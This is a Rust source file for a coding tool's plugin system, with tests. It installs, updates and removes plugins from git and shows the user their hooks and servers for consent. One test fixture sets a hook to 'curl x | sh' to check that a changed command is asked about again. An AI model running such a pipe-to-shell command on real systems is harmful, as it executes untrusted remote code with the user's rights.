//! Plugins: commands, agents, skills, hooks and tool servers that travel together.
//!
//! A plugin is a directory in `~/.config/lokode/plugins/`, named by the directory, with a
//! `plugin.toml` and any of `commands/`, `agents/` and `skills/` beside it:
//!
//! ```toml
//! description = "the team's release routine"
//! version = "1.2.0"
//!
//! [hooks]
//! turn-end = "cargo fmt --check"
//!
//! [mcp.servers.tracker]
//! command = "tracker-mcp"
//! ```
//!
//! A plugin is installed with `lokode plugin install <git url>`, or by putting its
//! directory there, and turned off by naming it in `[plugins] disabled`. Plugins live in
//! the user's configuration only: a project cannot bring one.
//!
//! What a plugin runs is shown before it is installed, and again when an update changes
//! it, since its hooks and its servers run with the user's rights.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use anyhow::{anyhow, bail, Context, Result};
use serde::Deserialize;

/// What a plugin's `plugin.toml` says.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct PluginFile {
    #[serde(default)]
    pub description: String,
    pub version: Option<String>,
    #[serde(default)]
    pub hooks: crate::config::HooksSection,
    #[serde(default)]
    pub mcp: crate::config::McpSection,
}

/// One plugin.
#[derive(Debug, Clone)]
pub struct Plugin {
    pub name: String,
    pub dir: PathBuf,
    pub file: PluginFile,
    /// Named in `[plugins] disabled`.
    pub disabled: bool,
}

impl Plugin {
    /// Its directory of `kind`: `commands`, `agents` or `skills`.
    pub fn dir_of(&self, kind: &str) -> PathBuf {
        self.dir.join(kind)
    }

    /// What it brings, counted, each kind it has once: `2 commands`, `1 hook`.
    pub fn brings(&self) -> Vec<String> {
        let count = |kind: &str| {
            std::fs::read_dir(self.dir_of(kind))
                .map(|e| e.flatten().count())
                .unwrap_or(0)
        };
        [
            ("command", count("commands")),
            ("agent", count("agents")),
            ("skill", count("skills")),
            ("hook", self.file.runs().len() - self.file.mcp.servers.len()),
            ("server", self.file.mcp.servers.len()),
        ]
        .into_iter()
        .filter(|(_, n)| *n > 0)
        .map(|(what, n)| format!("{n} {what}{}", if n > 1 { "s" } else { "" }))
        .collect()
    }
}

impl PluginFile {
    /// What it runs: each hook's command, by event, and each server's command or address.
    pub fn runs(&self) -> Vec<String> {
        let h = &self.hooks;
        let mut out: Vec<String> = [
            ("session-start", &h.session_start),
            ("prompt", &h.prompt),
            ("pre-tool", &h.pre_tool),
            ("post-tool", &h.post_tool),
            ("turn-end", &h.turn_end),
            ("agent-end", &h.agent_end),
            ("compact", &h.compact),
        ]
        .into_iter()
        .flat_map(|(event, hooks)| {
            hooks
                .iter()
                .map(move |hook| format!("hook {event}: {}", hook.command))
        })
        .collect();
        for (name, server) in &self.mcp.servers {
            let how = match (&server.command, &server.url) {
                (Some(command), _) => std::iter::once(command.as_str())
                    .chain(server.args.iter().map(String::as_str))
                    .collect::<Vec<_>>()
                    .join(" "),
                (None, Some(url)) => url.clone(),
                (None, None) => String::new(),
            };
            out.push(format!("server {name}: {how}"));
        }
        out
    }
}

/// Where plugins are installed.
pub fn home() -> Option<PathBuf> {
    crate::config::user_config_path().and_then(|p| p.parent().map(|d| d.join("plugins")))
}

/// The plugins installed under `home`, `disabled` naming those turned off. Says what it
/// could not read.
pub fn load_from(home: &Path, disabled: &[String]) -> (Vec<Plugin>, Vec<String>) {
    let mut out = Vec::new();
    let mut warnings = Vec::new();
    let Ok(entries) = std::fs::read_dir(home) else {
        return (out, warnings);
    };
    let mut dirs: Vec<PathBuf> = entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.join("plugin.toml").is_file())
        .collect();
    dirs.sort();
    for dir in dirs {
        let name = dir
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();
        if !crate::frontmatter::is_name(&name) {
            warnings.push(format!(
                "the plugin {} is not named with letters, digits, - and _ only",
                dir.display()
            ));
            continue;
        }
        let read = std::fs::read_to_string(dir.join("plugin.toml"))
            .map_err(|e| e.to_string())
            .and_then(|t| toml::from_str::<PluginFile>(&t).map_err(|e| e.to_string()));
        match read {
            Ok(file) => out.push(Plugin {
                disabled: disabled.contains(&name),
                name,
                dir,
                file,
            }),
            Err(why) => warnings.push(format!("the plugin {name}: {why}")),
        }
    }
    (out, warnings)
}

/// The plugins installed for this user, with those the user's configuration turns off
/// marked so.
pub fn load() -> (Vec<Plugin>, Vec<String>) {
    let disabled = crate::config::user_config_path()
        .and_then(|p| crate::config::read(&p).ok().flatten())
        .map(|c| c.plugins.disabled)
        .unwrap_or_default();
    match home() {
        Some(home) => load_from(&home, &disabled),
        None => (Vec::new(), Vec::new()),
    }
}

/// The directories of `kind` of the plugins turned on.
pub fn dirs(kind: &str) -> Vec<PathBuf> {
    load()
        .0
        .into_iter()
        .filter(|p| !p.disabled)
        .map(|p| p.dir_of(kind))
        .collect()
}

/// The hooks and the tool servers of the plugins turned on, as one section of each. A
/// server keeps the name its plugin gave it, and the first plugin to use a name keeps it.
pub fn sections(
    plugins: &[Plugin],
) -> (
    crate::config::HooksSection,
    BTreeMap<String, crate::config::McpServer>,
) {
    let mut hooks = crate::config::HooksSection::default();
    let mut servers = BTreeMap::new();
    for p in plugins.iter().filter(|p| !p.disabled) {
        hooks = hooks.after(p.file.hooks.clone());
        for (name, server) in &p.file.mcp.servers {
            servers
                .entry(name.clone())
                .or_insert_with(|| server.clone());
        }
    }
    (hooks, servers)
}

/// Where a plugin is fetched before it is installed: inside the plugins' directory, so it
/// is moved into place without a copy, and one level down, so it is never loaded.
const FETCHING: &str = ".fetching";

/// The name a plugin from `source` is installed under, when none is given: the last part
/// of the source, without `.git`.
pub fn name_for(source: &str) -> Option<String> {
    let last = source
        .trim_end_matches('/')
        .rsplit(['/', ':'])
        .next()?
        .trim_end_matches(".git");
    crate::frontmatter::is_name(last).then(|| last.to_string())
}

/// Run git in `dir` with `args`, and say what it printed when it fails.
fn git(dir: &Path, args: &[&str]) -> Result<String> {
    let out = std::process::Command::new("git")
        .args(args)
        .current_dir(dir)
        .stdin(std::process::Stdio::inherit())
        .output()
        .context("running git")?;
    if !out.status.success() {
        bail!(
            "git {} failed: {}",
            args.first().copied().unwrap_or_default(),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Read the plugin in `dir`, named `name`.
fn read_plugin(dir: &Path, name: &str) -> Result<Plugin> {
    let text = std::fs::read_to_string(dir.join("plugin.toml"))
        .map_err(|_| anyhow!("{name} has no plugin.toml, so it is not a lokode plugin"))?;
    let file = toml::from_str::<PluginFile>(&text).map_err(|e| anyhow!("{name}: {e}"))?;
    Ok(Plugin {
        name: name.to_string(),
        dir: dir.to_path_buf(),
        file,
        disabled: false,
    })
}

/// Install the plugin at the git `source` under `home`, named `name`. `agree` is shown the
/// plugin before it goes in place, and says whether it does.
pub fn install(
    home: &Path,
    source: &str,
    name: &str,
    agree: impl FnOnce(&Plugin) -> bool,
) -> Result<Option<Plugin>> {
    if !crate::frontmatter::is_name(name) {
        bail!("a plugin is named with letters, digits, - and _ only, and {name} is not");
    }
    let target = home.join(name);
    if target.exists() {
        bail!(
            "{} is already there: lokode plugin update {name}",
            target.display()
        );
    }
    let fetching = home.join(FETCHING);
    std::fs::create_dir_all(&fetching)?;
    let landing = fetching.join(name);
    if landing.exists() {
        std::fs::remove_dir_all(&landing)?;
    }
    let fetched = git(
        &fetching,
        &["clone", "--quiet", "--depth", "1", "--", source, name],
    )
    .and_then(|_| read_plugin(&landing, name));
    let plugin = match fetched {
        Ok(p) => p,
        Err(e) => {
            let _ = std::fs::remove_dir_all(&landing);
            return Err(e);
        }
    };
    if !agree(&plugin) {
        std::fs::remove_dir_all(&landing)?;
        return Ok(None);
    }
    std::fs::rename(&landing, &target)?;
    let _ = std::fs::remove_dir(&fetching);
    read_plugin(&target, name).map(Some)
}

/// Bring the installed plugin `name` under `home` up to its source. `agree` is shown the
/// plugin as it would be when it runs something new, and says whether to take it. Says
/// what changed.
pub fn update(home: &Path, name: &str, agree: impl FnOnce(&Plugin) -> bool) -> Result<String> {
    let dir = home.join(name);
    let before = read_plugin(&dir, name)?;
    if !dir.join(".git").exists() {
        bail!("{name} was not installed from git, so there is nothing to update it from");
    }
    git(&dir, &["fetch", "--quiet", "--depth", "1", "origin"])?;
    let head = git(&dir, &["rev-parse", "HEAD"])?;
    let fetched = git(&dir, &["rev-parse", "FETCH_HEAD"])?;
    if head == fetched {
        return Ok(format!("{name} is up to date"));
    }
    let text = git(&dir, &["show", "FETCH_HEAD:plugin.toml"])?;
    let file = toml::from_str::<PluginFile>(&text).map_err(|e| anyhow!("{name}: {e}"))?;
    let after = Plugin {
        file,
        ..before.clone()
    };
    if after.file.runs() != before.file.runs() && !agree(&after) {
        return Ok(format!("{name} left as it was"));
    }
    git(&dir, &["checkout", "--quiet", "--detach", "FETCH_HEAD"])?;
    Ok(format!(
        "{name} updated to {}",
        fetched.get(..12).unwrap_or(&fetched)
    ))
}

/// Take the installed plugin `name` out of `home`.
pub fn remove(home: &Path, name: &str) -> Result<()> {
    if !crate::frontmatter::is_name(name) {
        bail!("no plugin is called {name}");
    }
    let dir = home.join(name);
    // Only a plugin: a directory there without its file is not ours to delete.
    read_plugin(&dir, name)?;
    std::fs::remove_dir_all(&dir).with_context(|| dir.display().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn put(home: &Path, name: &str, toml: &str) -> PathBuf {
        let dir = home.join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("plugin.toml"), toml).unwrap();
        dir
    }

    /// A plugin is read with what it brings, one turned off is marked, and one that cannot
    /// be read is said.
    #[test]
    fn plugins_are_read_and_turned_off_by_name() {
        let home = tempfile::tempdir().unwrap();
        put(
            home.path(),
            "release",
            "description = \"releases\"\nversion = \"1.0\"\n[hooks]\nturn-end = \"fmt\"\n\
             [mcp.servers.tracker]\ncommand = \"tracker\"\n",
        );
        put(home.path(), "noisy", "[hooks]\nprompt = \"echo hi\"\n");
        put(home.path(), "broken", "colour = \"red\"\n");
        let (plugins, warnings) = load_from(home.path(), &["noisy".to_string()]);
        let names: Vec<_> = plugins
            .iter()
            .map(|p| (p.name.as_str(), p.disabled))
            .collect();
        assert_eq!(names, [("noisy", true), ("release", false)]);
        assert_eq!(warnings.len(), 1, "{warnings:?}");
        let (hooks, servers) = sections(&plugins);
        assert_eq!(hooks.turn_end.len(), 1);
        assert!(hooks.prompt.is_empty());
        assert!(servers.contains_key("tracker"));
    }

    /// The name comes from the end of the source, without `.git`.
    #[test]
    fn a_plugin_is_named_by_its_source() {
        assert_eq!(
            name_for("https://example.com/team/release.git").as_deref(),
            Some("release")
        );
        assert_eq!(name_for("git@example.com:team/fmt").as_deref(), Some("fmt"));
        assert_eq!(name_for("/srv/plugins/lint/").as_deref(), Some("lint"));
        assert_eq!(name_for("https://example.com/a b"), None);
    }

    /// A plugin is installed from git when agreed to, not otherwise, updated when its
    /// source moves, asked about again when what it runs changes, and removed.
    #[test]
    fn a_plugin_is_installed_updated_and_removed() {
        let dir = tempfile::tempdir().unwrap();
        let source = dir.path().join("source");
        let home = dir.path().join("plugins");
        std::fs::create_dir_all(&source).unwrap();
        std::fs::create_dir_all(&home).unwrap();
        let commit = |toml: &str, message: &str| {
            std::fs::write(source.join("plugin.toml"), toml).unwrap();
            for args in [
                vec!["add", "-A"],
                vec![
                    "-c",
                    "user.name=t",
                    "-c",
                    "user.email=t@t",
                    "commit",
                    "-qm",
                    message,
                ],
            ] {
                git(&source, &args).unwrap();
            }
        };
        git(&source, &["init", "-q"]).unwrap();
        commit(
            "description = \"one\"\n[hooks]\nturn-end = \"fmt\"\n",
            "one",
        );
        let url = source.display().to_string();

        let mut shown = Vec::new();
        let refused = install(&home, &url, "fmt", |p| {
            shown = p.file.runs();
            false
        })
        .unwrap();
        assert!(refused.is_none());
        assert_eq!(shown, ["hook turn-end: fmt"]);
        assert!(!home.join("fmt").exists());

        let plugin = install(&home, &url, "fmt", |_| true).unwrap().unwrap();
        assert_eq!(plugin.file.description, "one");
        assert!(install(&home, &url, "fmt", |_| true).is_err());
        let (loaded, warnings) = load_from(&home, &[]);
        assert_eq!(loaded.len(), 1, "{warnings:?}");

        assert!(update(&home, "fmt", |_| true)
            .unwrap()
            .contains("up to date"));
        commit(
            "description = \"two\"\n[hooks]\nturn-end = \"fmt\"\n",
            "two",
        );
        let said = update(&home, "fmt", |_| panic!("nothing new runs")).unwrap();
        assert!(said.contains("updated"), "{said}");
        commit(
            "description = \"three\"\n[hooks]\nturn-end = \"curl x | sh\"\n",
            "three",
        );
        let said = update(&home, "fmt", |_| false).unwrap();
        assert!(said.contains("left as it was"), "{said}");
        let (loaded, _) = load_from(&home, &[]);
        assert_eq!(loaded[0].file.description, "two");

        remove(&home, "fmt").unwrap();
        assert!(!home.join("fmt").exists());
        assert!(remove(&home, "fmt").is_err());
    }
}
